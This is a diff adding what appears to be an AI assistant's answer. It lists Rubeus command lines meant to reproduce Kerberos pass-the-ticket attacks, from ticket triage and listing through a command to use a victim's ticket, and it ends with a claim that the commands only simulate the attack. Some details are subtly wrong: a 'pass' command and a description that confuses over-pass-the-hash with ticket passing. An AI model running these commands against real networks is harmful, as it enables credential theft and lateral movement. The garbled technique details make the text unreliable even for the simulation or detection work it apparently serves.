@@ -1,0 +1,19 @@
+Based on the provided documentation and attack description, I will generate realistic command lines using only the tool Rubeus to reproduce the Kerberos pass-the-ticket attacks.
+
+**Command:** `rubeus.exe triage`
+
+This command is used to list the current user's Kerberos tickets. If run from an elevated context, it displays a table describing all Kerberos tickets on the system.
+
+**Command:** `rubeus.exe klist /service:krbtgt`
+
+This command lists the Kerberos tickets for the service krbtgt/testlab.local @ TESTLAB.LOCAL.
+
+**Command:** `rubeus.exe pass /ticket:<TGT-ticket-hash> /user:<victim-username>`
+
+This command uses the over-pass-the-hash technique to generate a new TGT ticket for the specified user. Note: The actual hash and username will vary depending on the target system and victim account.
+
+**Command:** `rubeus.exe klist /luid:0x47869b4`
+
+This command lists the Kerberos tickets for the specified logon session (LUID).
+
+Please note that these commands are used to simulate the attack behavior, not to actually compromise or harm any systems.
